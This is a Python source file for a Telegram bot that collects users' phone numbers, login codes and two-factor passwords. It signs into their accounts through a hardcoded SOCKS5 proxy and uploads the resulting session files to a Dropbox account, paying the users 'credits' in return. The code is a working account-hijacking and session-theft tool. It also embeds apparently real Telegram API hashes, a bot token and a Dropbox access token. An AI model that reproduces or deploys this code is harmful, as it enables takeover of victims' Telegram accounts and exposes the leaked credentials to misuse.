
# ---- Your Telegram API keys ----
# ---- Your Telegram API keys ----
import os
import json
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient, errors
import dropbox
from telethon import TelegramClient
from telethon.sessions import StringSession
import socks

# === Telegram API Credentials ===
api_id = 28805917
api_hash = '4bde3d75255801b1f7fa046bfebc72e2'

# === Proxy Settings ===
proxy_host = '93.187.188.30'
proxy_port = 1080
proxy = (socks.SOCKS5, proxy_host, proxy_port)

# === Create Telethon Client ===


# ---- Your Telegram API keys ----
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# ---- Dropbox API Integration ----
DROPBOX_ACCESS_TOKEN = "sl.u.AFsiDN3tPs973d4xL9bBbHijOQum2bSocEcfAk51OK3VUcO4B3_vDR6kRZJDPIloE-RgKeIBxIBKkuaZzoAe-ePTHOMqKjYmFQlTVo1ybiz2vCpG_QcyM_qZFLcWDZ3PcBT--tQEnKyDJYwYTuRYT-kf6Gc37yo4giSqCM7wE366Oz2Ec0JJcdSjYy3xBZF7y88NyoZ47sK9XTmcvO1PqK-L-rUVk1zFr_8MJmG70_mihGBDGP7SXYGuuIll2_zSKtn4yzzhRcRNm-h6x99ZHvHyAWAaEp3nAon1EgpfZ64WQu-gJYAJrYQDAhbya4gXkHbzdxRlfWn_56a5K5xeJDtfbQBw1KsIg7GONr7uC3zWdVolZDwsNEq4qL0FKC6KdD0ZaLosFVz7bA6n-ep_Cx_edfvA6QRG-v0lGhdXzZt-zofjuYbcs7SWVPH2ImZPRyX6AwIsfUre1rR4sIOcmhGvhH4JdRT5qCwgRRkZD-V-Riv_7Vg3CKcRwMhlQPq0L3rEhNbDxeIT5E9fhAoxrzyDxbUrG27pwKzfUcEqoXGqI79AXB64MNN__okKzq1h9btS5Y4uKNasQwALCSw1TZS7rKVOUs2KI5Nt99MRM5KIetBXdmdMJSosWSYbQRs1jzQLeRsRMDPUXe8c5ihLE1d-Ot0FALQ_FPlKzzIF0F7gAcYbKq7C0eaMRYq35N8aZM9gKXpYRQU8wAkhmOkavdrjLN0UAW1r1FmhvbJz0m7OJ3KOFIQhaOqx6t88FZICCAcSpZk6JIpshEpl2OBCJzDa23h97eG498NOovgWw4suriIznIgLObcSQxot6ec8SWod_RC8hO5KIgQ6qEXuzpTEidygQkd1mk2aaT0-xwibP5Jswila_OTfEtGFKr0M_7DHBaD5nWSx84KZVqeR88FA3TCFKiSSc9ulXJTZIfMdtltkXVe-JOecekgG6YTuWTi2fQ1xjhcRs3cu4w8dPZvf23pJJmKb3WGrJYZDQBYlAvE1SdyHrzjK7I1Mzx69ZseDBsvVwvvnhrG3F_dL1G77mTkMPj-z-u7B4O-_GtwuO-Qkalr-xbBBB870Rt4obTHPcVzT9G-pCNx7En7H93uqw7y0uAs0jf47Uup60YJDybu2poTYlYdotXVAc3ln2Q5OIKBSLrSxnMGIIAn1epycX0W7vicsocMO9JJlb1O1KUcMULzpZvzqoXSQjnR9pO1P4ZcQmPoXM4eLPK5WUzWvqunNsC-T2w-kYRmoU1QQIpyKc4-FgyX_Q3muZEr8i093j50f8uHGM27AVjuVNE33bBYrgS3xrh6uiCTWyAA4sM6ZlNdKRMtJa1-AeHIaxP_VxSzcBN3AvC-cM_Mr04CZMEdesfB-vmIKTdEYkepvTHoPJBFhQJGmLfJSu5Eq_pg_y63oDK2gxrqMt4f7esvjDW90x_jFsPsstyXVeD9Rtf_Qhu9FOVTo5QGX_gmke87Tv8v8Bvfo93eyBZRgxNpp"  # <-- Replace with your Dropbox access token
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

# ---- States for Conversation ----
ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)

# ---- Dictionary to track users' login states ----
user_sessions = {}

# ---- Path to store credit files ----
CREDIT_FILE_PATH = "credits"

# Make sure the credits directory exists
os.makedirs(CREDIT_FILE_PATH, exist_ok=True)

# ---- Add Credit to User ----
async def add_credit(user_id, amount):
    file_path = f"{CREDIT_FILE_PATH}/{user_id}.json"
    
    # Check if the user already has a credit file
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            data = json.load(f)
        # Increase the credit balance
        data["credits"] += amount
    else:
        # If no credit file exists, create a new one with the initial amount
        data = {"credits": amount}
    
    # Save the updated credits to the file
    with open(file_path, "w") as f:
        json.dump(data, f)
    
    return data["credits"]

# ---- Get Credit for User ----
async def get_user_credits(user_id):
    file_path = f"{CREDIT_FILE_PATH}/{user_id}.json"
    
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            data = json.load(f)
        return data["credits"]
    else:
        return 0  # Default to 0 if no credit file exists

# ---- Start Command ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Hello! Send me your phone number (with country code, e.g., +123456789).")
    return ASK_PHONE

# ---- Handle Phone Number ----
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.message.from_user.id

    # Create a new Telethon client for this user
    session_name = f"sessions/{phone}"  # Saving sessions inside 'sessions' folder
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(StringSession(), api_id, api_hash, proxy=proxy)

    await client.connect()

    try:
        sent = await client.send_code_request(phone)
        user_sessions[user_id] = {"client": client, "phone": phone}
        await update.message.reply_text("📨 OTP code sent! Please send the code you received.")
        return ASK_CODE
    except errors.PhoneNumberInvalidError:
        await update.message.reply_text("❌ Invalid phone number. Please send a valid one.")
        await client.disconnect()
        return ASK_PHONE

# ---- Handle OTP Code ----
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    code = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]
    phone = session["phone"]

    try:
        await client.sign_in(phone, code)
        await update.message.reply_text("✅ Logged in successfully!")

        # Add 1 credit after successful login
        new_credit_balance = await add_credit(user_id, 1)  # Adding 1 credit as an example

        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, phone)

        await client.disconnect()

        # Inform the user that their credits have been updated
        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")

        return ConversationHandler.END

    except errors.SessionPasswordNeededError:
        await update.message.reply_text("🔒 2FA is enabled. Please send your password.")
        return ASK_PASSWORD

    except errors.PhoneCodeInvalidError:
        # If wrong code, offer retry or skip
        reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
        return ASK_CODE

# ---- Handle Retry or Skip ----
async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text == "retry":
        await update.message.reply_text("🔁 Okay, please send the code again.")
        return ASK_CODE
    else:
        user_id = update.message.from_user.id
        session = user_sessions.get(user_id)
        if session:
            await session["client"].disconnect()
            user_sessions.pop(user_id, None)
        await update.message.reply_text("⏩ Skipped. Use /start to begin again.")
        return ConversationHandler.END

# ---- Handle 2FA Password ----
async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    password = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]

    try:
        await client.sign_in(password=password)
        await update.message.reply_text("✅ Logged in successfully with 2FA!")

        # Add 1 credit after successful login
        new_credit_balance = await add_credit(user_id, 1)

        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, session["phone"])

        await client.disconnect()

        # Inform the user about their credits
        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")

        return ConversationHandler.END
    except errors.PasswordHashInvalidError:
        await update.message.reply_text("❌ Incorrect password. Please send again.")
        return ASK_PASSWORD

# ---- Upload Session File to Dropbox ----
async def upload_session_to_dropbox(client, phone):
    """Uploads session file to Dropbox"""
    session_file_path = f"sessions/{phone}.session"  # <-- ADD ".session"
    dropbox_path = f"/sessions/{phone}.session"      # <-- ADD ".session"

    if not os.path.exists(session_file_path):
        print(f"❌ Session file not found for {phone}. Skipping upload.")
        return

    with open(session_file_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
        
    print(f"✅ Session file for {phone} uploaded to Dropbox.")

# ---- Command to check credits ----
async def check_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    # Get the user's credit balance
    credit_balance = await get_user_credits(user_id)
    
    # Send a message with the current credit balance
    await update.message.reply_text(f"💳 Your current credit balance is: {credit_balance} credits.")

# ---- Cancel Command ----
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ---- Main Function ----
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [
                MessageHandler(filters.Regex("^(Retry|Skip)$"), ask_code_retry),
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)
            ],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    # Add the /credits command handler to check credits
    app.add_handler(CommandHandler("credits", check_credits))

    app.add_handler(conv_handler)

    print("Bot running...")
    app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
